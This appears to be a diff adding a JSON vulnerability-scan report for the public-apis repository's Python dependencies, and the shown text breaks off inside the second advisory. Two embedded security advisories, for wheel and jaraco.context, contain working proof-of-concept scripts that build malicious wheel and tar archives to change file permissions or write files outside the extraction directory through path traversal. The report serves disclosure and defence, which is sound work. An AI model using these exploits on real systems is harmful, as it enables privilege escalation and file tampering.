@@ -1,0 +1,4912 @@
+{
+  "repo": {
+    "id": 54346799,
+    "name": "public-apis",
+    "full_name": "public-apis/public-apis",
+    "owner": "public-apis",
+    "url": "https://github.com/public-apis/public-apis",
+    "clone_url": "https://github.com/public-apis/public-apis.git",
+    "language": "Python",
+    "size_kb": 5012,
+    "stars": 400664,
+    "forks": 42905,
+    "description": "A collective list of free APIs",
+    "created_at": "2016-03-20T23:49:42Z",
+    "updated_at": "2026-02-27T07:11:33Z",
+    "default_branch": "master",
+    "crawled_at": "2026-02-27T07:11:40.565874",
+    "local_path": "data/repos/public-apis_public-apis",
+    "clone_status": "already_exists"
+  },
+  "sbom_file": "data/sboms/public-apis_public-apis_sbom.json",
+  "checked_at": "2026-03-05T18:11:28.681594",
+  "total_components_checked": 23,
+  "total_components": 23,
+  "vulnerable_components": 7,
+  "total_vulnerabilities": 25,
+  "components": [
+    {
+      "name": "setuptools",
+      "version": "79.0.1",
+      "purl": "pkg:pypi/setuptools@79.0.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/setuptools@79.0.1",
+      "group": "",
+      "description": "Easily download, build, install, upgrade, and uninstall Python packages",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools-79.0.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools-79.0.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.9"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681250"
+    },
+    {
+      "name": "zipp",
+      "version": "3.19.2",
+      "purl": "pkg:pypi/zipp@3.19.2",
+      "type": "library",
+      "bom-ref": "pkg:pypi/zipp@3.19.2",
+      "group": "",
+      "description": "Backport of pathlib-compatible object wrapper for zip files",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/zipp-3.19.2.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/zipp-3.19.2.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681284"
+    },
+    {
+      "name": "wheel",
+      "version": "0.45.1",
+      "purl": "pkg:pypi/wheel@0.45.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/wheel@0.45.1",
+      "group": "",
+      "description": "A built-package format for Python",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/wheel-0.45.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/wheel-0.45.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-8rrh-rw8j-w5fx",
+          "summary": "Wheel Affected by Arbitrary File Permission Modification via Path Traversal in wheel unpack",
+          "details": "### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```",
+          "aliases": [
+            "CVE-2026-24049"
+          ],
+          "modified": "2026-02-04T03:06:55.268134Z",
+          "published": "2026-01-22T18:02:56Z",
+          "related": [
+            "CGA-w2x3-fvxx-qqf5"
+          ],
+          "database_specific": {
+            "severity": "HIGH",
+            "nvd_published_at": "2026-01-22T05:16:23Z",
+            "github_reviewed": true,
+            "github_reviewed_at": "2026-01-22T18:02:56Z",
+            "cwe_ids": [
+              "CWE-22"
+            ]
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/wheel/security/advisories/GHSA-8rrh-rw8j-w5fx"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24049"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/wheel/commit/7a7d2de96b22a9adf9208afcc9547e1001569fef"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/wheel/commit/934fe177ff912c8e03d5ae951d3805e1fd90ba5e"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/pypa/wheel"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/wheel/releases/tag/0.46.2"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "wheel",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/wheel"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0.40.0"
+                    },
+                    {
+                      "fixed": "0.46.2"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.40.0",
+                "0.41.0",
+                "0.41.1",
+                "0.41.2",
+                "0.41.3",
+                "0.42.0",
+                "0.43.0",
+                "0.44.0",
+                "0.45.0",
+                "0.45.1",
+                "0.46.0",
+                "0.46.1"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-8rrh-rw8j-w5fx/GHSA-8rrh-rw8j-w5fx.json",
+                "last_known_affected_version_range": "<= 0.46.1"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 1,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681294"
+    },
+    {
+      "name": "typing_extensions",
+      "version": "4.12.2",
+      "purl": "pkg:pypi/typing-extensions@4.12.2",
+      "type": "library",
+      "bom-ref": "pkg:pypi/typing-extensions@4.12.2",
+      "group": "",
+      "description": "Backported and Experimental Type Hints for Python 3.8+",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/typing_extensions-4.12.2.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/typing_extensions-4.12.2.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681302"
+    },
+    {
+      "name": "typeguard",
+      "version": "4.3.0",
+      "purl": "pkg:pypi/typeguard@4.3.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/typeguard@4.3.0",
+      "group": "",
+      "description": "Run-time type checker for Python",
+      "licenses": [
+        {
+          "license": {
+            "name": "MIT"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/typeguard-4.3.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/typeguard-4.3.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681308"
+    },
+    {
+      "name": "tomli",
+      "version": "2.0.1",
+      "purl": "pkg:pypi/tomli@2.0.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/tomli@2.0.1",
+      "group": "",
+      "description": "A lil' TOML parser",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/tomli-2.0.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/tomli-2.0.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.7"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681315"
+    },
+    {
+      "name": "platformdirs",
+      "version": "4.2.2",
+      "purl": "pkg:pypi/platformdirs@4.2.2",
+      "type": "library",
+      "bom-ref": "pkg:pypi/platformdirs@4.2.2",
+      "group": "",
+      "description": "A small Python package for determining appropriate platform-specific dirs, e.g. a `user data dir`.",
+      "licenses": [
+        {
+          "expression": "MIT"
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/platformdirs-4.2.2.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/platformdirs-4.2.2.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681322"
+    },
+    {
+      "name": "packaging",
+      "version": "24.2",
+      "purl": "pkg:pypi/packaging@24.2",
+      "type": "library",
+      "bom-ref": "pkg:pypi/packaging@24.2",
+      "group": "",
+      "description": "Core utilities for Python packages",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/packaging-24.2.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/packaging-24.2.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681328"
+    },
+    {
+      "name": "more-itertools",
+      "version": "10.3.0",
+      "purl": "pkg:pypi/more-itertools@10.3.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/more-itertools@10.3.0",
+      "group": "",
+      "description": "More routines for operating on iterables, beyond itertools",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/more_itertools-10.3.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/more_itertools-10.3.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681334"
+    },
+    {
+      "name": "jaraco.text",
+      "version": "3.12.1",
+      "purl": "pkg:pypi/jaraco.text@3.12.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/jaraco.text@3.12.1",
+      "group": "",
+      "description": "Module for text manipulation",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.text-3.12.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.text-3.12.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681341"
+    },
+    {
+      "name": "jaraco.functools",
+      "version": "4.0.1",
+      "purl": "pkg:pypi/jaraco.functools@4.0.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/jaraco.functools@4.0.1",
+      "group": "",
+      "description": "Functools like those found in stdlib",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.functools-4.0.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.functools-4.0.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681347"
+    },
+    {
+      "name": "jaraco.context",
+      "version": "5.3.0",
+      "purl": "pkg:pypi/jaraco.context@5.3.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/jaraco.context@5.3.0",
+      "group": "",
+      "description": "Useful decorators and context managers",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.context-5.3.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.context-5.3.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-58pv-8j8x-9vj2",
+          "summary": "jaraco.context Has a Path Traversal Vulnerability",
+          "details": "### Summary\nThere is a Zip Slip path traversal vulnerability in the jaraco.context package affecting setuptools as well, in `jaraco.context.tarball()` function. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed.\nThe strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`.\nNote that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`.\n\nThe code can be found:\n- https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91\n- https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76 (inherited)\n\nThis report was also sent to setuptools maintainers and they asked some questions regarding this.\n\nThe lengthy answer is:\n\nThe vulnerability seems to be the `strip_first_component` filter function, not the tarball function itself and has the same behavior on any tested Python version locally (from 11 to 14, as I noticed that there is a backports conditional for the tarball).\nThe stock tarball for Python 3.12+ is considered not vulnerable (until proven otherwise 😄) but here the custom filter seems to overwrite the native filtering and introduces the issue - while overwriting the updated secure Python 3.12+ behavior and giving a false sense of sanitization.\n\nThe short answer is:\n\nIf we are talking about Python < 3.12 the tarball and jaraco implementations /  behaviors are relatively the same but for Python 3.12+ the jaraco implementation overwrites the native tarball protection.\n\nSampled tests:\n<img width=\"1634\" height=\"245\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ce6c0de6-bb53-4c2b-818a-d77e28d2fbeb\" />\n\n### Details\n\nThe flow with setuptools in the mix:\n```\nsetuptools._vendor.jaraco.context.tarball() > req = urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as tf: > tf.extractall(path=target_dir, filter=strip_first_component) > strip_first_component (Vulnerable)\n```\n\n### PoC\n\nThis was tested on multiple Python versions > 11 on a Debian GNU 12 (bookworm).\nYou can run this directly after having all the dependencies:\n```py\n#!/usr/bin/env python3\nimport tarfile\nimport io\nimport os\nimport sys\nimport shutil\nimport tempfile\nfrom setuptools._vendor.jaraco.context import strip_first_component\n\n\ndef create_malicious_tarball(traversal_to_root: str):\n    tar_data = io.BytesIO()\n    with tarfile.open(fileobj=tar_data, mode='w') as tar:\n        # Create a malicious file path with traversal sequences\n        malicious_files = [\n            # Attempt 1: Simple traversal to /tmp\n            {\n                'path': f'dummy_dir/{traversal_to_root}tmp/pwned_by_zipslip.txt',\n                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',\n                'name': 'pwned_via_tmp'\n            },\n            # Attempt 2: Try to write to home directory\n            {\n                'path': f'dummy_dir/{traversal_to_root}home/pwned_home.txt',\n                'content': b'[ZIPSLIP] Attempted write to home directory',\n                'name': 'pwned_via_home'\n            },\n            # Attempt 3: Try to write to current directory parent\n            {\n                'path': 'dummy_dir/../escaped.txt',\n                'content': b'[ZIPSLIP] File in parent directory!',\n                'name': 'pwned_escaped'\n            },\n            # Attempt 4: Legitimate file for comparison\n            {\n                'path': 'dummy_dir/legitimate_file.txt',\n                'content': b'This file stays in target directory',\n                'name': 'legitimate'\n            }\n        ]\n        for file_info in malicious_files:\n            content = file_info['content']\n            tarinfo = tarfile.TarInfo(name=file_info['path'])\n            tarinfo.size = len(content)\n            tar.addfile(tarinfo, io.BytesIO(content))\n\n    tar_data.seek(0)\n    return tar_data\n\n\ndef exploit_zipslip():\n    print(\\\"[*] Target: setuptools._vendor.jaraco.context.tarball()\\\")\n\n    # Create temporary directory for extraction\n    temp_base = tempfile.mkdtemp(prefix=\\\"zipslip_test_\\\")\n    target_dir = os.path.join(temp_base, \\\"extraction_target\\\")\n\n    try:\n        os.mkdir(target_dir)\n        print(f\\\"[+] Created target extraction directory: {target_dir}\\\")\n\n        target_dir_abs = os.path.abspath(target_dir)\n        print(target_dir_abs)\n        depth_to_root = len([p for p in target_dir_abs.split(os.sep) if p])\n        traversal_to_root = \\\"../\\\" * depth_to_root\n        print(f\\\"[+] Using traversal_to_root prefix: {traversal_to_root!r}\\\")\n\n        # Create malicious tarball\n        print(\\\"[*] Creating malicious tar archive...\\\")\n        tar_data = create_malicious_tarball(traversal_to_root)\n\n        try:\n            with tarfile.open(fileobj=tar_data, mode='r') as tf:\n                for member in tf:\n                    # Apply the ACTUAL vulnerable function from setuptools\n                    processed_member = strip_first_component(member, target_dir)\n                    print(f\\\"[*] Extracting: {member.name:40} -> {processed_member.name}\\\")\n\n                    # Extract to target directory\n                    try:\n                        tf.extract(processed_member, path=target_dir)\n                        print(f\\\"    ✓ Extracted successfully\\\")\n                    except (PermissionError, FileNotFoundError, OSError) as e:\n                        print(f\\\"    ! {type(e).__name__}: Path traversal ATTEMPTED\\\")\n        except Exception as e:\n            print(f\\\"[!] Extraction raised exception: {type(e).__name__}: {e}\\\")\n\n        # Check results\n        print(\\\"[*] Checking for extracted files...\\\")\n\n        # Check target directory\n        print(f\\\"[*] Files in target directory ({target_dir}):\\\")\n        if os.path.exists(target_dir):\n            for root, _, files in os.walk(target_dir):\n                level = root.replace(target_dir, '').count(os.sep)\n                indent = ' ' * 2 * level\n                print(f\\\"{indent}{os.path.basename(root)}/\\\")\n                subindent = ' ' * 2 * (level + 1)\n                for file in files:\n                    filepath = os.path.join(root, file)\n                    try:\n                        with open(filepath, 'r') as f:\n                            content = f.read()[:50]\n                        print(f\\\"{subindent}{file}\\\")\n                        print(f\\\"{subindent}  └─ {content}...\\\")\n                    except:\n                        print(f\\\"{subindent}{file} (binary)\\\")\n        else:\n            print(f\\\"[!] Target directory not found!\\\")\n\n        print()\n        print(\\\"[*] Checking for traversal attempts...\\\")\n        print()\n\n        # Check if files escaped\n        traversal_attempts = [\n            (\\\"/tmp/pwned_by_zipslip.txt\\\", \\\"Escape to /tmp\\\"),\n            (os.path.expanduser(\\\"~/pwned_home.txt\\\"), \\\"Escape to home\\\"),\n            (os.path.join(temp_base, \\\"escaped.txt\\\"), \\\"Escape to parent\\\"),\n        ]\n\n        escaped = False\n        for check_path, description in traversal_attempts:\n            if os.path.exists(check_path):\n                print(f\\\"[+] Path Traversal Confirmed: {description}\\\")\n                print(f\\\"      File created at: {check_path}\\\")\n                try:\n                    with open(check_path, 'r') as f:\n                        content = f.read()\n                    print(f\\\"      Content: {content}\\\")\n                    print(f\\\"      Removing: {check_path}\\\")\n                    os.remove(check_path)\n                except Exception as e:\n                    print(f\\\"      Error reading: {e}\\\")\n                escaped = True\n            else:\n                print(f\\\"[-] OK: {description} - No escape detected\\\")\n\n        if escaped:\n            print(\\\"[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!\\\")\n        else:\n            print(\\\"[-] No path traversal detected (mitigation in place)\\\")\n\n    finally:\n        # Cleanup\n        print()\n        print(f\\\"[*] Cleaning up: {temp_base}\\\")\n        try:\n            shutil.rmtree(temp_base)\n        except Exception as e:\n            print(f\\\"[!] Cleanup error: {e}\\\")\n\n\ndef check_python_version():\n    print(f\\\"[+] Python version: {sys.version}\\\")\n    # Python 3.11.4+ added 